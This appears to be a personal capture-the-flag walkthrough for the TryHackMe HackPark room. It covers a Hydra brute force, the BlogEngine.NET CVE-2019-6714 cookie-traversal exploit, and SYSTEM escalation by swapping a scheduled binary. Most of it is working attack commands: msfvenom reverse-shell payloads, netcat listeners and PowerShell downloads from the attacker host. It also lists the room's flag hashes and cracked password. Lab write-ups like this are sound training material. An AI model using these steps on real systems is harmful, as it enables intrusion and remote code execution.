# HackPark — Manual Walkthrough Guide

> **Platform**: TryHackMe — https://tryhackme.com/room/hackpark
> **Difficulty**: Medium | **OS**: Windows Server 2012 R2
> **Completed**: 2026-03-08 | **Status**: Fully Pwned

---

## Prerequisites

| Requirement | Detail |
|---|---|
| Kali Linux | VM or native (all tools run on Kali) |
| THM VPN | Connected — tun0 interface must be up |
| Target IP | Assigned by THM when machine starts |
| Your tun0 IP | Check with: ip addr show tun0 |

---

## Quick Reference

| Item | Value |
|---|---|
| Target IP (example) | 10.49.153.22 (get fresh IP from THM) |
| Admin credentials | admin : 1qaz2wsx |
| tun0 IP (example) | 192.168.205.106 (yours may differ) |
| Exploit script | ~/projects/HackPark/exploit_cve.py |
| Shell listener port | 4444 |
| SYSTEM listener port | 5555 |
| File server port | 8080 |

---

## Phase 1 — Reconnaissance

### 1.1 Connect VPN
```bash
sudo openvpn ~/Downloads/your-thm-vpn.ovpn &
ip addr show tun0 | grep inet
```

### 1.2 Nmap Scan
```bash
nmap -Pn -sC -sV -p- 10.49.153.22 -oN ~/projects/HackPark/nmap_initial.txt
```

Expected results:
```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 8.5
3389/tcp open  ms-wbt-server Microsoft Terminal Services
  Hostname: HACKPARK
  OS: Windows Server 2012 R2 (6.3.9600)
```

### 1.3 Identify Web Application
- Browse to http://10.49.153.22
- App: BlogEngine.NET on IIS 8.5
- Login page: http://10.49.153.22/Account/login.aspx
- Default username: admin

---

## Phase 2 — Initial Foothold

### 2.1 Brute Force Admin Password (Hydra)

```bash
hydra -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  10.49.153.22 \
  http-post-form \
  "/Account/login.aspx:__VIEWSTATE=<value>&__EVENTVALIDATION=<value>&ctl00\$MainContent\$LoginUser\$UserName=^USER^&ctl00\$MainContent\$LoginUser\$Password=^PASS^&ctl00\$MainContent\$LoginUser\$LoginButton=Log+in:Login failed" \
  -t 30
```

Result: admin : 1qaz2wsx

> Tip: Capture live VIEWSTATE/EVENTVALIDATION tokens from the login page using Burp Suite or browser DevTools.

### 2.2 CVE-2019-6714 — BlogEngine.NET RCE

Vulnerability: BlogEngine.NET 3.3.6 path traversal via theme cookie allows uploading and executing a malicious .ascx web control as the IIS user.

How it works:
1. Upload PostView.ascx (reverse shell) to /App_Data/files/YYYY/MM/
2. Set the theme cookie to ../../App_Data/files/YYYY/MM/
3. BlogEngine loads the ASCX file as a theme control and executes the reverse shell

#### Step 1 — Start listener (Terminal 1)
```bash
sudo nc -lvnp 4444
```

#### Step 2 — Run the exploit (Terminal 2)
```bash
python3 ~/projects/HackPark/exploit_cve.py
```

Expected output in Terminal 2:
```
[*] Logging in...
[+] Logged in
[*] Uploading PostView.ascx...
[+] Upload: 201
[*] Triggering with theme cookie: ../../App_Data/files/2026/03/
[+] TIMEOUT — shell executed! Check your listener!
```

TIMEOUT message = shell fired successfully. Check Terminal 1.

#### Step 3 — Confirm foothold (Terminal 1)
```
connect to [192.168.205.106] from (UNKNOWN) [10.49.153.22]
C:\windows\system32\inetsrv> whoami
iis apppool\blog
```

> IMPORTANT: The exploit uses the theme COOKIE method (not URL ?theme= parameter).
> The payload uploads to a date-based path: App_Data/files/YYYY/MM/PostView.ascx
> This is the correct CVE-2019-6714 trigger — URL parameter method does NOT work.

---

## Phase 3 — Privilege Escalation

### 3.1 Generate SYSTEM Payload (Terminal 2)

```bash
ip addr show tun0 | grep inet    # note your tun0 IP

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your-tun0-ip> LPORT=5555 -f exe -o /tmp/Message.exe

python3 -m http.server 8080 -d /tmp/
```

### 3.2 Start SYSTEM Listener (Terminal 3)
```bash
sudo nc -lvnp 5555
```

### 3.3 Download Payload to Target (Terminal 1 — your shell)
```cmd
powershell -c "Invoke-WebRequest http://<your-tun0-ip>:8080/Message.exe -OutFile C:\Windows\Temp\Message.exe"
```

### 3.4 Replace SystemScheduler Binary
```cmd
powershell -c "Copy-Item C:\Windows\Temp\Message.exe 'C:\Program Files (x86)\SystemScheduler\Message.exe' -Force"
```

Why this works: SystemScheduler runs Message.exe every ~30 seconds as NT AUTHORITY\SYSTEM.
The directory has world-writable permissions — any user can replace the binary.

> Note: Use PowerShell Copy-Item, not cmd copy. The IIS shell lacks sufficient permissions for the standard copy command.

### 3.5 Wait for SYSTEM Shell (Terminal 3)

Wait up to 60 seconds:
```
connect to [192.168.205.106] from (UNKNOWN) [10.49.153.22]
C:\PROGRA~2\SYSTEM~1> whoami
nt authority\system
```

### 3.6 Grab Flags
```cmd
type C:\Users\Administrator\Desktop\root.txt
type C:\Users\jeff\Desktop\user.txt
```

| Flag | Hash |
|---|---|
| user.txt | 759bd8af507517bcfaede78a21a73e39 |
| root.txt | 7e13d97f05f7ceb9881a3eb3d78d3e72 |

---

## Phase 4 — Post-Exploitation (WinPEAS)

### 4.1 Download WinPEAS (Terminal 2)
```bash
wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -O /tmp/winPEAS.bat
```

### 4.2 Run WinPEAS on Target
```cmd
powershell -c "Invoke-WebRequest http://<your-tun0-ip>:8080/winPEAS.bat -OutFile C:\Windows\Temp\wp.bat"
C:\Windows\Temp\wp.bat
```

### 4.3 Get Original Install Date
```cmd
wmic os get installdate
```
Output: 20190803104323.000000-420
Formatted answer: 8/3/2019, 10:43:23 AM

---

## Troubleshooting

| Issue | Fix |
|---|---|
| Shell does not connect after exploit | Verify tun0 IP in exploit_cve.py matches current VPN IP |
| copy command fails for Message.exe | Use PowerShell Copy-Item — cmd lacks sufficient permissions |
| Shell freezes or dies | Ctrl+C, restart nc listener, re-run exploit_cve.py |
| HTTP server unreachable from target | Confirm python3 -m http.server 8080 -d /tmp/ is still running |
| THM machine unresponsive | Request new machine from THM, update IP in exploit_cve.py |
| Upload returns 401 | Credentials may have changed on reset — re-verify admin login |

---

## Key Files on Kali

| File | Purpose |
|---|---|
| ~/projects/HackPark/exploit_cve.py | Main exploit: login, upload ASCX, trigger via cookie |
| ~/projects/HackPark/PostView.ascx | C# reverse shell payload (ASCX format) |
| ~/projects/HackPark/nmap_initial.txt | Saved nmap results |
| /tmp/Message.exe | SYSTEM escalation payload (regenerate each session) |
| /tmp/winPEAS.bat | WinPEAS enumeration script |

---

## Related Notes

- [[HackPark/README]] — attack chain overview and checklist
- [[HackPark/THM-Questions]] — all THM room answers
- [[HackPark/VAPT-Report]] — full penetration test report
